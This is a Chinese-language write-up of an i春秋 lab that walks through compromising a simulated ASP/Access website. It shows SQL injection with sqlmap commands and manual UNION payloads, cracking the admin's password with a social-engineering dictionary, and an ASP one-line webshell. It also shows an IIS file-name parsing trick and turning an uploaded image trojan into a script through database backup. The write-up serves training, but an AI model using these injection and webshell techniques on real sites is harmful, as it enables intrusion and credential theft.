---
title: 【i春秋】渗透测试入门 —— 网站综合渗透实验
copyright: true
date: 2018-04-15 10:19:43
tags: [i春秋,Pentest,Exploit,Writeup,CMS,Crypto,Social Engineering,Web,ASP,Database,SQLi,Trojan,Vulnerability,Privilege,CMD]
categories: [InfoSec,Pentest]
---

# 0x00 前言

本实验同样呈现了一次完整的模拟渗透流程，从最初获取网站管理员的账号密码，然后获得主站的 webshell，最后通过提权获得服务器系统的最高权限。

从实验手册上给出的工具提示可看出，本次渗透貌似更注重**端口扫描**与**社会工程学的运用**，其实大可不必被其限制了思路，当作一种参考方向即可，按照以往的渗透方法一样能达到目的。

简单介绍一下靶机环境：主站为**秋潮个人摄影网站管理系统**，主站下还有一个 **[LeadBBS](http://www.leadbbs.com/index.asp) 论坛**，均采用 **ASP** 后端脚本语言与 **Microsoft Office Access** 数据库，此类小型 CMS 一般都没有官网，且漏洞较多无人维护，只能从各大软件平台下载源码；服务器系统为 **Windows Server 2003 Enterprise Edition**，如果没打好补丁，此系统也是漏洞百出。显然，靶机采用了经典网站服务器的标配 **Windows + IIS + ASP + Access** 。

可见，本实验的渗透方法与靶机环境与 [【i春秋】渗透测试入门 —— 我很简单，请不要欺负我](https://ciphersaw.github.io/2018/03/20/%E3%80%90i%E6%98%A5%E7%A7%8B%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%20%E2%80%94%E2%80%94%20%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/) 中的大同小异，因此可作为本文的参考。

- 题目链接：[https://www.ichunqiu.com/battalion?t=2&r=54399](https://www.ichunqiu.com/battalion?t=2&r=54399)
- 解题链接：[https://www.ichunqiu.com/vm/111/1](https://www.ichunqiu.com/vm/111/1)

<!-- more -->

![guide](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/guide.png)

# 0x01 后台管理员「linhai」的密码是？

后台管理员的密码是打开渗透测试大门的钥匙，但网上关于「秋潮个人摄影网站管理系统」的漏洞信息少之又少，毕竟是个小众 CMS，所以我们只能自己动手，丰衣足食。根据这几次模拟渗透的经验，获取后台管理员密码的思路主要有**敏感信息泄露、SQL 报错注入返回敏感信息、手工注入或利用自动化注入工具直接读取数据库**等，我们还是先按照常规套路：**寻找网页中存在的注入点**。

## SQL 自动化注入

使用 SQL 自动化注入工具是读取数据库信息最高效的方法，熟悉多种注入工具也是一名合格渗透工程师的基本要求，国内外的 SQL 自动化注入工具种类繁多，常见的有明小子（Domian）、穿山甲（Pangolin）、啊D注入工具、SQLMap 等。

下面以明小子（Domian）与 SQLMap 为例进行演示，以上工具均在实验工具箱中的【注入工具】文件夹下。

### 明小子（Domian）

**明小子（Domian）**是国内的一款 Web 应用程序综合渗透工具，有可视化图形界面，简单易用，在国内安全圈极负盛名。

打开工具，依次点击 **SQL注入 -> 批量扫描注入点 -> 添加网址**，填入主站 URL `http://www.test/ichunqiu/`，保存后点击 **批量分析注入点**：

![domain_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/domain_info.png)

分析完毕后，可见又是一堆数字型 SQL 注入，以第 3 个注入点为例，右键点击 **检测注入**：

![domain_injectable](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/domain_injectable.png)

接着会自动跳转至 **SQL注入猜解检测** 选项卡，再点击 **开始检测**，证实了 `http://www.test.ichunqiu/see.asp?id=480&titleid=102` 确实是一个可用的注入点：

![domain_verification](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/domain_verification.png)

确认可注入后，点击 **猜解表名** 后得到 3 张表，接着选中 `admin` 表，点击 **猜解列名** 后得到 3 个列名，在所有列名前打上钩，点解 **猜解内容** 后即可得到管理员的账号为 `linhai`，16 位的密码哈希值为 `d7e15730ef9708c0`。至此，通过明小子工具成功地获取了管理员的账号密码。

![domain_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/domain_result.png)

### SQLMap

[**SQLMap**](http://sqlmap.org/) 是一款专注于自动化 SQL 注入检测的开源渗透工具，用 Python 脚本语言编写，能在装有 Python 2.6.x 与 Python 2.7.x 的系统上跨平台运行，支持对数十种常见数据库的检测，被誉为 SQL 注入领域的一大渗透神器。

由于 SQLMap 只支持命令行界面，且默认不支持批量扫描注入点，故其易用性不如明小子，但也丝毫不影响其渗透威力，反而还拥有更高的检测效率与更广的检测范围。SQLMap 作为渗透工程师常用且必备的工具，应当重点掌握。下面将列出渗透过程中常用的命令及用法，建议同时参考[官方文档](https://github.com/sqlmapproject/sqlmap/wiki)。

（1）`python sqlmap.py -h`：查询帮助手册。
（2）`python sqlmap.py -u <URL>`：检测该 URL 是否存在注入（末尾记得写上查询参数）。
（3）`python sqlmap.py -u <URL> --dbs`：查询所有数据库名。
（4）`python sqlmap.py -u <URL> --current-db`：查询当前数据库名。
（5）`python sqlmap.py -u <URL> -D <database> --tables`：查询某数据库中的所有表名。
（6）`python sqlmap.py -u <URL> -D <database> -T <table> --columns`：查询某数据表中的所有列名。
（7）`python sqlmap.py -u <URL> -D <database> -T <table> -C <column> --dump`：查询某列中的所有数据。

以上是通过 GET 方式来检测注入点，并进行 SQL 注入读取数据库中数据的常规套路。**注意一个特例：由于 Microsoft Access 数据库结构特殊，注入时不必通过（3）或（4）来查询数据库名，直接从（5）开始查询表名即可，`-D` 选项也可省去。**

> 小贴士：为了避免在命令行界面输入中文进入【SQLMap】目录，因此使用前建议将【SQLMap】文件夹拷贝到 C 盘下。

确保了命令行路径在【SQLMap】目录下后，根据（2）输入命令 `python sqlmap.py -u "http://www.test.ichunqiu/see.asp?id=480&titleid=102"`，若询问「已检测到后台数据库为 Microsoft Access，需要跳过对其他数据库的检测吗？」填 `Y`，询问「想对 Microsoft Access 进行更全面的测试吗？」填 `Y`，询问「想尝试用随机整数值进行测试吗？」填 `Y`，询问「已确认 `id` 参数可注入，还需检测其他参数？」填 `y`，询问「已确认 `titleid` 参数可注入，还需检测其他参数？」填 `y`，询问「请选择一个注入点？」填 `0`。**注意：此处 URL 中包含两个请求参数，所以最好用双引号将 URL 括起来。**

> 小贴士：以上操作是为了全面检验注入点，实际上找到一个注入点后，即可填 `N` 终止检测其他参数。为简化后续注入流程的叙述，在选择注入点时默认填 `0`。

结果显示 `id` 与 `titleid` 参数均为**基于布尔的盲注（boolean-based blind）**，并且返回了一些服务器相关信息，如：服务器操作系统为 **Windows 2003 或 Windows XP**，Web 应用程序采用了 **APS.NET、Microsoft IIS 6.0、ASP** 等建站技术，后端数据库数理系统为 **Microsoft Access**。以上对服务器相关信息的收集有助于后续更高效精准的渗透。

![sqlmap_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/sqlmap_info.png)

知道了后端数据库是 Microsoft Access 后，可以跳过（3）或（4）直接进行（5），输入命令 `python sqlmap.py -u "http://www.test.ichunqiu/see.asp?id=480&titleid=102" --tables`，若询问「需要检测常用表名是否存在？」填 `Y`，询问「需要的线程数量？」填最大值 `10`。等待扫描全部结束后，得到了包含 `admin` 表在内的 4 张表。

![sqlmap_tables](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/sqlmap_tables.png)

继续执行（6）中的命令，输入 `python sqlmap.py -u "http://www.test.ichunqiu/see.asp?id=480&titleid=102" -T "admin" --columns`，若询问「需要检测常用列名是否存在？」填 `Y`，询问「需要的线程数量？」填最大值 `10`。等待扫描全部结束后，得到了 `admin` 与 `password` 等 3 个字段。

![sqlmap_columns](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/sqlmap_columns.png)

最后执行（7）中的命令，输入 `python sqlmap.py -u "http://www.test.ichunqiu/see.asp?id=480&titleid=102" -T "admin" -C "admin,password" --dump`，等待其枚举完毕，若询问「需要临时保存结果的哈希值？」填 `N`，询问「需要用字典攻击来破解结果？」填 `n`，最终可得到管理员的账号密码。

![sqlmap_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/sqlmap_result.png)

## SQL 手工注入

除了会使用 SQL 自动化注入工具，手工注入也应该是渗透工程师的基本技能之一。下面仍旧针对上述注入点，演示手工注入获取 Access 数据库内容的全过程。详细指导可参考：

> [asp+access sql手工注入步骤](http://blog.csdn.net/geecky/article/details/51297268)
> [access手工注入](https://www.cnblogs.com/0nth3way/articles/7123033.html)

### Step 1：猜解表名

在火狐浏览器打开存在注入点的页面，将 URL 改为 `http://www.test.ichunqiu/see.asp?id=480&titleid=102 AND EXISTS(SELECT * FROM <table>)`，其中 `<table>` 为待猜解的表名，如果表名存在，页面将显示正常，否则出现异常。**注意：如果管理员把库名、表名、列名更改得随机复杂，手工注入将变得非常困难。**

打开 HackBar 工具，我们对 `admin`、`news`、`config` 等常见表名进行猜解，发现均能正常显示：

![manual_tables](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/manual_tables.png)

### Step 2：猜解列数

已知 `admin` 表存在后，接着猜解当前未知表的列数，用于后续的[联合查询（UNION SELECT）](http://www.w3school.com.cn/sql/sql_union.asp)，因为**联合查询的必要条件是每个查询的列数需要严格相等，并且有的数据库要求每列的数据类型也必须相同**。

猜解列数最便捷的方法是利用 [**ORDER BY**](http://www.w3school.com.cn/sql/sql_orderby.asp) 语句的隐藏用法。一般来说，`ORDER BY <column>` 代表对 `<column>` 列进行升排序，而 **`ORDER BY <column_order>` 代表对第 `<column_order>` 列进行升排序**。显然，`<column_order>` 的最大取值即为查询数据的列数，因此，当发现 `ORDER BY n` 与 `ORDER BY n+1` 的页面显示不同时，可判断当前查询数据的列数为 n。

**注意，只有在后端数据库的查询语句为 `SELECT * FROM admin` 时，当前查询数据的列数 n 才等于数据库 `admin` 的总列数。**详情可参考：[sql注入之order by猜列数问题](https://segmentfault.com/a/1190000002655427)。

经过简单测试，可以确定查询数据的列数为 2：

![manual_num_true](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/manual_num_true.png)

![manual_num_false](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/manual_num_false.png)

### Step 3：找出显位点

下面要构造联合查询 `UNION SELECT 1,2,...,n FROM <table>` 找出显位点，其中列数为 n，表名为 `<table>`。**注意：对于数据类型不兼容的数据库，以上方法会造成语句错误，此时需改为 `UNION SELECT null,null,...,null FROM <table>` 才能正常执行，但同时也失去了查找显位点的效果。**

> 小贴士：查询结果中的某些数据会出现在当前页面，而这些数据对应的列称为**显位点**。

由于目标数据库只有 2 列，简单测试后即可发现第 1 列为显位点：

![manual_points](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/manual_points.png)

### Step 4：猜解列名

最后一步，就是用猜想的列名去替换显位点，如果猜想正确，则页面会显示数据内容，否则出现异常。我们对 `user`、`username`、`account`、`admin`、`pwd`、`password`、`key`、`credit` 等常见列名进行猜解，终于从 `admin`、`password` 两列中读取到管理员的账号密码：

![manual_admin](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/manual_admin.png)

![manual_password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/manual_password.png)

## 社工字典攻击

既然实验手册提示使用社工工具，那不妨对管理员「linhai」进行一次社工攻击。

将主站所有页面都浏览一遍，在页面底部均能发现以下信息：管理员的 QQ 号为 **1957692**，Email 为 **linhai0812@21cn.com**，并由此推算出生日期是 **8 月 21 日**，还发现了主站的**管理入口**：

![linhai_email_qq](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/linhai_email_qq.png)

还在 **摄影论坛** 选项卡中发现一个用 LeadBBS 搭建的论坛，习惯性地用账号 `admin` 与密码 `admin` 尝试登录，居然成功进去了（若尝试失败，直接注册一个账号也是能登录进去查看相关信息的），并在 **论坛信息 -> 论坛管理团队** 中发现「linhai」为论坛管理人员：

![linhai_manager](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/linhai_manager.png)

 点击「linhai」查看其相关信息，在 **签名栏** 中发现他生于唐山大地震，即 **1976 年**：

![linhai_born](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/linhai_born.png)

以上是在网站上能挖掘到关于「linhai」的全部信息，接下来打开工具箱【社工辅助】中的**亦思想社会工程学字典生成器**，将收集的信息填入，点击 **生成字典**，在本目录下打开字典 **mypass.txt**，即可看到一系列密码的猜测值：

![dict](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/dict.png)

再打开【破解工具】->【MD5】中的 **MD5Crack2**，在 **破解单个密文** 栏中填入上文获取的密码哈希值 `d7e15730ef9708c0`，在 **使用字典 -> 字典一** 中点击 **浏览**，选中刚才生成的社工字典（在 **文件类型** 中选择 **文本文件(*.txt)** 即可看到文本文件），点击 **开始**，成功破解后即可看到管理员的密码明文 `linhai19760812`：

![md5crack2](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/md5crack2.png)

由于模拟渗透环境的特殊性，该密码哈希值经常被提交至各大 MD5 破解网站，因此用在线的  [MD5解密工具](http://www.dmd5.com/md5-decrypter.jsp) 也能得到管理员的密码明文：

> 小贴士：一般来说，复杂的管理员密码，是很难通过在线破解立即查询到明文的，除非之前被提交查询过，这时只能通过其他手段获取密码明文。

![linhai_password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/linhai_password.png)

# 0x02 LeadBBS 论坛可否获得 webshell？

**注意：上一节获取 `linhai` 账户的密码 `linhai19760812`，是用于登录主站管理后台的，不是用来登录论坛的，虽然「linhai」也是论坛管理员，但他的密码目前还未知。**因此，我们继续用 `admin` 账户在论坛中搜刮漏洞，看看可否从论坛中获得 webshell。

浏览了整个论坛，发现只在 **我的控制面板 -> 修改用户资料** 页面中有写入与上传功能。先尝试将一句话木马 `<%Eval Request("cmd")%>` 写入用户资料，不出意外的话 `<`、`>`、`"` 等符号均被转义为 [HTML 字符实体](http://www.w3school.com.cn/html/html_entities.asp)，木马写入失败：

![bbs_html_entity](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/bbs_html_entity.png)

再尝试上传图片功能，将 C 盘下的 `工具.ico` 改名为 `test.asp;gj.jpg`，目的是利用 IIS 解析漏洞，将图片解析为 ASP 脚本文件。点击 **选择文件**，选中 `test.asp;gj.jpg` 后点击 **上传**：

![bbs_uploading](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/bbs_uploading.png)

发现文件被重新随机命名，因此想控制文件名利用解析漏洞，也以失败而告终：

![bbs_uploaded](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/bbs_uploaded.png)

此外，笔者还用了 Burp Suite 工具抓包改包，试图构造畸形目录触发解析漏洞，但在图片上传的包中也没发现可控的上传路径，故尝试失败。有兴趣的读者可自行尝试，此处就不演示了。

用浏览器也没有搜索到 LeadBBS 有效的漏洞信息，不过，没有绝对安全的系统，有兴趣可以下载论坛源码进行审计，相信一定能找到突破口的。总之，目前暂时**不可以**从 LeadBBS 论坛获得 webshell，若各位找到了获得 webshell 的方法，笔者愿闻其详。

# 0x03 SQL Server 数据库 sa 账号的密码是？

点击在主站页面底部发现的 **管理入口**，用账号 `linhai` 与密码 `linhai19760812` 登录进入后台：

> 小贴士：若 CMS 保留默认设置，即使主站页面没给出后台管理入口，也能通过后台扫描工具，或搜索该 CMS 的默认后台管理路径来获得。

![login_back](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/login_back.png)

由于主站是个小众 CMS，在未能获取有效漏洞信息，以及没有对其代码审计的情况下，应该对所有页面中可能出现写入或上传漏洞的地方进行黑盒测试。下面以几个测试点为例，演示黑盒测试的过程。

## Failure 1：添加图片

在 **图片管理 -> 添加图片** 页面，发现可以上传图片，先将【我的文档】->【图片收藏】->【示例图片】目录中的 `Winter.jpg` 复制到 C 盘目录下，方便后续使用，然后在页面填写相关信息，并在 **图片一** 中选择 `Winter.jpg` 后点击 **上传**：

![backend_add_picture](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_add_picture.png)

上传之后，在 **管理图片** 与 **推荐组图** 页面中均未能发现 `Winter.jpg`，由此推断添加图片功能被禁用了。

## Failure 2：文章管理

在 **系统管理 -> 文章图片** 页面，发现可以写入文章，遂尝试写入一句话木马：

![backend_write_article](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_write_article.png)

写入之后，打开文章，同样发现 `<`、`>`、`"` 等符号均被转义为 HTML 字符实体，木马写入失败：

![backend_write_article_escape](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_write_article_escape.png)

## Success：系统变量设置 + 备份数据库

在 **设置管理 -> 系统变量设置** 页面，发现可以写入设置信息，以及上传图片。不过，在尝试写入一句话木马时，点击 **设置** 却得到了错误信息：

![backend_setting_error](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_setting_error.png)

此路不通，心里莫名一紧，只剩下最后的上传图片功能了。点击 **上传图片**，选择 `Winter.jpg`，哟嘿，居然能成功上传：

![backend_upload](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_upload.png)

带着一点小激动，继续点击 **生成代码**，发现图片的路径也给显示出来了：

![backend_upload_path](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_upload_path.png)

这说明有戏啊！接着探索，在 **数据管理 -> 备份/恢复数据库** 页面发现，似乎能把指定文件通过备份转换为 ASP 脚本文件：

![backend_backup_default](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_backup_default.png)

二话不说，先试一波。从默认备份路径可看出，当前路径应该在 `/admin/` 下，所以数据库路径为 `upfiles/201841631359.jpg`，备份的数据库路径为 `upfiles/201841631359.asp`：

![backend_backup_picture](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_backup_picture.png)

成功备份后，访问 URL `http://www.test.ichunqiu/admin/upfiles/201841631359.asp`，得到 ASP 脚本解析错误信息：

![backend_backup_error](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_backup_error.png)

因为该 ASP 脚本是由图片文件转化而来，解析错误是理所当然啊！这也进一步证实：**通过备份数据库可以将目标文件转换了 ASP 脚本**。

找到方向后，开始制作图片马，不过注意，**不能通过 `copy` 命令或文本编辑器将一句话木马附在真正的图片后，否则会出现解析错误。**因此，必须将木马插在文本文件中，再把后缀名改成图片格式即可。为了图片马能成功上传，最好填充大量文本信息，为了使文本文件的大小更接近图片文件：

![backend_trojan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_trojan.png)

重复上述步骤，将图片马通过备份数据库转换成 ASP 脚本后，访问 URL `http://www.test.ichunqiu/admin/upfiles/201841637712.asp`，看到如下页面，说明图片马上传成功：

![backend_trojan_uploaded](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/backend_trojan_uploaded.png)

## 菜刀连接获取 webshell

下面的操作相信大家已轻车熟路，在工具箱【webshell】目录下拔出[中国菜刀](http://www.zhongguocaidao.com/)，在 **添加SHELL** 中填入目标 URL 与请求参数后保存：

![chopper_trojan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/chopper_trojan.png)

双击 shell 记录，成功连接网站的文件管理系统：

![chopper_file_manager](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/chopper_file_manager.png)

然后搜索网站根目录下所有文件，查找有关 SQL Server 数据库的用户信息，最终在 `/conn_old.asp` 文件中发现账户 `sa` 的密码为 `linhai123456woaini`：

